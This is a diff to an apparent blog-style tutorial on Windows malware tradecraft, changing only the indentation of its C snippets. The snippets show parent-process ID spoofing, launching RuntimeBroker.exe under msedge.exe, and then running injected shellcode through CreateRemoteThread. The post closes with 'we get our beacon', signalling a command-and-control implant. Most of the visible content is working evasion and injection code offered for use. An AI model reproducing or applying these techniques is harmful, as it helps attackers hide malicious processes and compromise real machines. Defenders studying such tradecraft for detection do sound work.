@@ -55,57 +55,57 @@ we'll loop over the processes until we find msedge, from there we'll utilize it 
 first we'll create the target process path:
 
 ```c
-	// making the target process path
-	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
+// making the target process path
+sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
 
-	// making the `lpCurrentDirectory` parameter in CreateProcessA
-	sprintf(CurrentDir, "%s\\System32\\", WnDr);
+// making the `lpCurrentDirectory` parameter in CreateProcessA
+sprintf(CurrentDir, "%s\\System32\\", WnDr);
 ```
 
 from there we can specifiy the attributes to the process we're creating:
 ```c
-	// this will fail with ERROR_INSUFFICIENT_BUFFER / 122
-	InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);
+// this will fail with ERROR_INSUFFICIENT_BUFFER / 122
+InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);
 
-	// allocating enough memory
-	pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
-	if (pThreadAttList == NULL) {
-		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
-		return FALSE;
-	}
+// allocating enough memory
+pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
+if (pThreadAttList == NULL) {
+	printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
+	return FALSE;
+}
 
-	// calling InitializeProcThreadAttributeList again passing the right parameters
-	if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList)) {
-		printf("[!] InitializeProcThreadAttributeList Failed With Error : %d \n", GetLastError());
-		return FALSE;
-	}
+// calling InitializeProcThreadAttributeList again passing the right parameters
+if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList)) {
+	printf("[!] InitializeProcThreadAttributeList Failed With Error : %d \n", GetLastError());
+	return FALSE;
+}
 
-	if (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
-		printf("[!] UpdateProcThreadAttribute Failed With Error : %d \n", GetLastError());
-		return FALSE;
-	}
+if (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
+	printf("[!] UpdateProcThreadAttribute Failed With Error : %d \n", GetLastError());
+	return FALSE;
+}
 
-	// setting the `LPPROC_THREAD_ATTRIBUTE_LIST` element in `SiEx` to be equal to what was
-	// created using `UpdateProcThreadAttribute` - that is the parent process
-	SiEx.lpAttributeList = pThreadAttList;
+// setting the `LPPROC_THREAD_ATTRIBUTE_LIST` element in `SiEx` to be equal to what was
+// created using `UpdateProcThreadAttribute` - that is the parent process
+SiEx.lpAttributeList = pThreadAttList;
 ```
 
 finally we'll goahead and use CreateProcessA to create the process:
 ```c
-	if (!CreateProcessA(
-		NULL,
-		lpPath,
-		NULL,
-		NULL,
-		FALSE,
-		EXTENDED_STARTUPINFO_PRESENT,
-		NULL,
-		CurrentDir,
-		&SiEx.StartupInfo,
-		&Pi)) {
-		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
-		return FALSE;
-	}
+if (!CreateProcessA(
+	NULL,
+	lpPath,
+	NULL,
+	NULL,
+	FALSE,
+	EXTENDED_STARTUPINFO_PRESENT,
+	NULL,
+	CurrentDir,
+	&SiEx.StartupInfo,
+	&Pi)) {
+	printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
+	return FALSE;
+}
 ```
 
 at this point we should have a process that (in our case) is "Runtimebroker.exe -embedding" running under msedge.exe (lol). We successfully found a parent for our orphan! 
@@ -165,11 +165,11 @@ here we create a filemapping with rwx, then we'll map the view of the payload to
 we're practically done now, all is left is to execute the shellcode in the process we have injected it, we can do this in many ways but for simplicity we can do this with CreateRemoteThread with the process and address:
 
 ```
-	hThread = CreateRemoteThread(hProcess, NULL, NULL, pAddress, NULL, NULL, NULL);
-	if (hThread == NULL)
-		printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
+hThread = CreateRemoteThread(hProcess, NULL, NULL, pAddress, NULL, NULL, NULL);
+if (hThread == NULL)
+	printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
 
-	return 0;
+return 0;
 ```
 
 annnnndd we get our beacon!
